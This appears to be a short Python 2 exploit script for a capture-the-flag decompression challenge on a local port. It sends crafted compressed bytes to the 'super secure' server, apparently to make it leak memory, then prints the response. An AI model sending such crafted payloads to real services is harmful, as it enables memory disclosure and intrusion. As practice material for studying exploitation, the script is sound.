#!/usr/bin/python

import socket
import sys
import struct

HOST = '127.0.0.1'
PORT = 5001

header = "Welcome on this super secure decompression server! Good luck breaking it!\n"
liste = []

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

s.send(("\x01\x00\xff\x01")*5)
s.send("\xff")

s.shutdown(socket.SHUT_WR)

s.recv(len(header)+2)
tmp = s.recv(1024)
while tmp:
    print tmp
    tmp = s.recv(1024)
